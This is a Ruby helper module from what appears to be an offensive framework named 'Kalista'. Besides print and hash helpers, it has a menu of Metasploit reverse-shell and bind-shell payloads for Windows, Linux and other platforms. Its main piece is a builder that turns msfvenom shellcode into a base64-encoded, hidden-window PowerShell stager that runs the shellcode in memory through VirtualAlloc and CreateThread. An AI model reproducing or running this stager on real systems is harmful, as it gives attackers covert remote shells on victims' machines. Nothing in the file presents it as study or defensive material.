# SUpport Functions for use throughout the Kalista framework
# Just keeps things clean and easier to manage having separate from core
# imo.....add what you like, how you like

# Generate a random aplha string length of value of num
def randz(num)
	(0...num).map{ ('a'..'z').to_a[rand(26)] }.join
end

#Simple Print Line
def print_line(string)
	print "#{string}\n".white
end

#Simple Status Indiicator
def print_status(string)
	print "[*]".light_green + " #{string}\n".white
end

#Simple Caution Status Indiicator
def print_caution(string)
	print "[*]".light_yellow + " #{string}\n".white
end


#Error Message
def print_error(string)
	print "[*]".light_red + " #{string}\n".white
end

# Execute commands safely, result is returned as an array
def commandz(foo)
	bar = IO.popen("#{foo}")
	foobar = bar.readlines
	return foobar
end

#Execute commands in separate process in standalone X-window :)
def fireNforget(command)
	#Spawn our connection in a separate terminal cause its nicer that way!!!!!
	pid = Process.fork
	if pid.nil?
	  	# In child
		sleep(1) #dramatic pause :p
	  	exec "#{command}" #This can now run in its own process thread and we dont have to wait for it
	else
		# In parent, detach the child process
		Process.detach(pid)
	end
end

#Small function to help select the actual payload to use from MSF
# Call this function with the mode number set to define which payloads will be displayed for user choosing
# 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder
def payload_selector(mode)

	winblowz = { '1' => 'windows/meterpreter/reverse_tcp', '2' => 'windows/x64/meterpreter/reverse_tcp', '3' => 'windows/shell/reverse_tcp', '4' => 'windows/x64/shell/reverse_tcp', '5' => 'windows/vncinject/reverse_tcp', '6' => 'windows/x64/vncinject/reverse_tcp', '7' => 'windows/dllinject/reverse_tcp', '8' => 'windows/dllinject/reverse_http', '9' => 'windows/shell/reverse_http', '10' => 'windows/meterpreter/reverse_http', '11' => 'windows/meterpreter/reverse_https', '12' => 'cmd/windows/reverse_perl', '13' => 'cmd/windows/reverse_ruby', '14' => 'generic/windows/reverse_shell', '15' => 'generic/reverse_shell' }

	tux = { '1' => 'linux/x86/meterpreter/reverse_tcp', '2' => 'linux/x64/shell/reverse_tcp', '3' => 'linux/x86/shell/reverse_tcp', '4' => 'linux/x64/shell_reverse_tcp', '5' => 'linux/x86/shell_reverse_tcp', '6' => 'aix/ppc/shell_reverse_tcp', '7' => 'bsd/sparc/shell_reverse_tcp', '8' => 'bsd/x86/shell/reverse_tcp', '9' => 'solaris/x86/shell_reverse_tcp', '10' => 'solaris/sparc/shell_reverse_tcp', '11' => 'cmd/unix/reverse', '12' => 'cmd/unix/reverse_bash', '13' => 'cmd/unix/reverse_netcat', '14' => 'cmd/unix/reverse_perl', '15' => 'cmd/unix/reverse_python', '16' => 'cmd/unix/reverse_ruby', '17' => 'generic/shell_reverse_tcp', '18' => 'generic/reverse_shell' }

	genrev = { '1' => 'java/meterpreter/reverse_tcp', '2' => 'java/shell/reverse_tcp', '3' => 'java/shell_reverse_tcp', '4' => 'php/meterpreter/reverse_tcp', '5' => 'php/reverse_perl', '6' => 'php/reverse_php', '7' => 'php/shell_findsock', '8' => 'python/shell_reverse_tcp_ssl', '9' => 'ruby/shell_reverse_tcp', '10' => 'generic/reverse_shell' }

	binder = { '1' => 'windows/meterpreter/bind_tcp', '2' => 'windows/x64/meterpreter/bind_tcp', '3' => 'windows/x64/shell/bind_tcp', '4' => 'windows/x64/shell/bind_tcp', '5' => 'linux/x86/meterpreter/bind_tcp', '6' => 'linux/x86/shell/bind_tcp', '7' => 'linux/x64/shell/bind_tcp', '8' => 'aix/ppc/shell_bind_tcp', '9' => 'bsd/x86/shell/bind_tcp', '10' => 'solaris/x86/shell_bind_tcp', '11' => 'solaris/sparc/shell_bind_tcp', '12' => 'java/shell/bind_tcp', '13' => 'java/meterpreter/bind_tcp', '14' => 'php/meterpreter/bind_tcp', '15' => 'generic/bind_shell' }

	while(true)
		print_caution("Select Type of Payload: ")
		print_caution("1) Bind Shell")
		print_caution("2) Reverse Shell")
		type=gets.chomp
		puts
		if type == '2' #REVERSE SHELL
			while(true)
				print_caution("Select the Payload Category: ")
				print_caution("1) Windows")
				print_caution("2) Linux")
				print_caution("3) OTHER")
				os=gets.chomp
				print_status("")
				print_caution("Select Payload: ")
				if os == '1'
					while(true)
						if mode.to_i == 1
							winblowz.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}".light_yellow : "#{key}) #{value}".light_yellow }
							sizer=winblowz.size
						else
							winblowz.each { |key,value| (puts (key.to_i < 10) ? "#{key})  #{value}".light_yellow : "#{key}) #{value}".light_yellow) unless value == 'generic/reverse_shell' }
							sizer=winblowz.size - 1
						end
						answer=gets.chomp
						puts
						if answer.to_i == 0 or answer.to_i > sizer.to_i
							print_error("")
							print_error("Please Enter a Valid Option!")
							print_error("")
						else
							payload = winblowz[answer]
							break
						end
					end
					break
				elsif os =='2'
					while(true)
						if mode.to_i == 1
							tux.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}" }
							sizer=tux.size
						else
							tux.each { |key,value| (puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}") unless value == 'generic/reverse_shell' }
							sizer=tux.size - 1
						end
						answer=gets.chomp
						puts
						if answer.to_i == 0 or answer.to_i > sizer.to_i
							print_error("")
							print_error("Please Enter a Valid Option!")
							print_error("")
						else
							payload = tux[answer]
							break
						end
					end
					break
				elsif os == '3'
					while(true)
						if mode.to_i == 1
							genrev.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}".light_yellow : "#{key}) #{value}".light_yellow }
							sizer=genrev.size
						else
							genrev.each { |key,value| (puts (key.to_i < 10) ? "#{key})  #{value}".light_yellow : "#{key}) #{value}".light_yellow) unless value == 'generic/reverse_shell' }
							sizer=genrev.size - 1
						end
						answer=gets.chomp
						puts
						if answer.to_i == 0 or answer.to_i > sizer.to_i
							print_error("")
							print_error("Please Enter a Valid Option!")
							print_error("")
						else
							payload = genrev[answer]
							break
						end
					end
					break
				end
			end
			break
		elsif type == '1' #BIND SHELL
			while(true)
				print_caution("Select Payload: ")
				if mode.to_i == 1
					binder.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}".light_yellow : "#{key}) #{value}".light_yellow }
					sizer=binder.size
				else
					binder.each { |key,value| (puts (key.to_i < 10) ? "#{key})  #{value}".light_yellow : "#{key}) #{value}".light_yellow) unless value == 'generic/bind_shell' }
					sizer=binder.size - 1
				end
				answer=gets.chomp
				print_status("")
				if answer.to_i == 0 or answer.to_i > sizer.to_i
					print_error("")
					print_error("Please Enter a Valid Option!")
					print_error("")
				else
					payload = binder[answer]
					break
				end
			end
			break
		end
	end
	return payload
end

#Preps and Builds our PowerShell Command to run our payload in memory upon execution on target.....
def powershell_builder(venomstring)
	# venomstring should be the arguments needed for msfvenom to build the base payload/shellcode ('-p <payload> LHOST=<ip> LPORT=<port>'
	shellcode="#{`#{MSFPATH}/msfvenom #{venomstring} -b \\x00`}".gsub(";", "").gsub(" ", "").gsub("+", "").gsub('"', "").gsub("\n", "").gsub('buf=','').strip.gsub('\\',',0').sub(',', '')
	#	=> yields a variable holding our escapped shellcode with ',' between each char.....

	print_status("Converting Base ShellCode to PowerShell friendly format.....")
	# Borrowed from one of several appearances across the many Python written scripts :p
	ps_base = "$code = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };"
		# => Our base PowerShell wrapper to get the job done now in var

	ps_base_cmd = ps_base.sub('%s', shellcode) 
		# => place our shellcode in the Python placeholder :p

	#Prep it for final stages and put in funky ps format....
	ps_cmd_prepped=String.new
	ps_base_cmd.scan(/./) {|char| ps_cmd_prepped += char + "\x00" }

	# Base64 Encode our Payload so it is primed & ready for PowerShell usage
	stager = Base64.encode64("#{ps_cmd_prepped}")

	#The magic is now ready!
	ps_cmd = 'powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand ' + stager.gsub("\n", '')
	return ps_cmd
end

#Gnerate a MS5 Hash given string
def md5(string)
	Digest::MD5.hexdigest(string)
end

#Gnerate a SHA1 Hash given string
def sha1(string)
	OpenSSL::Digest::SHA1.hexdigest(string)
end
